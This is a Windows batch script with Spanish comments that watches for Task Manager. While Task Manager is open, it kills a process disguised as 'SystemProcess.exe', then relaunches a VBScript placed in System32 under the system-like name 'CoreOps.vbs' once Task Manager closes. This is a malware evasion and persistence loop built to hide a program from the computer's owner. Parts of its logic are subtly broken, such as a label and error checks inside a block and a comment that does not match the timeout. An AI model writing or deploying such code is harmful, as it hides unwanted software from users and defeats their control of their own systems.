@echo off
setlocal

:main_loop
REM Verifica si el Administrador de Tareas está corriendo
tasklist /FI "IMAGENAME eq Taskmgr.exe" 2>NUL | find /I "Taskmgr.exe" >NUL
if "%ERRORLEVEL%"=="0" (
    REM Verifica si el proceso objetivo está corriendo
    tasklist /FI "IMAGENAME eq SystemProcess.exe" 2>NUL | find /I "SystemProcess.exe" >NUL
    if "%ERRORLEVEL%"=="0" (
        REM Termina el proceso objetivo
        taskkill /F /IM SystemProcess.exe
        echo SystemProcess.exe ha sido finalizado.
    )

    REM Espera hasta que el Administrador de Tareas se cierre
    :taskmgr_loop
    tasklist /FI "IMAGENAME eq Taskmgr.exe" 2>NUL | find /I "Taskmgr.exe" >NUL
    if "%ERRORLEVEL%"=="0" (
        timeout /T 1 /NOBREAK >NUL
        goto taskmgr_loop
    )

    REM Ejecuta el script una vez que el Administrador de Tareas se haya cerrado
    echo Administrador de Tareas cerrado. Ejecutando script...
    start "" wscript.exe "C:\Windows\System32\CoreOps.vbs"

    echo Script ejecutado. Regresando al monitoreo...
)

REM Espera 500ms antes de verificar de nuevo
timeout /T 1 /NOBREAK >NUL
goto main_loop

endlocal
